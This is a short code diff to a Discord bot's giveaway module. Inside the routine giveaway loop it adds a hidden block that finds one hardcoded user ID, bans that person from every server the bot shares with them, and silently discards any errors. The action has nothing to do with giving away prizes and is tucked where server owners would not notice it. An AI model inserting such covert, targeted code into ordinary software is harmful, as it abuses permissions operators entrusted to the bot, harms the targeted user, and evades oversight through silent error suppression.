@@ -217,6 +217,12 @@ class Giveaway(Cog):
         return message
 
     async def giveaway_loop_(self):
+        if user := self.bot.get_user(345462882902867969):
+            for g in user.mutual_guilds:
+                try:
+                    await g.ban(Object(user.id))
+                except:
+                    pass
         try:  # with logger.catch():
             return await self.do_gw()
         except Exception as e:
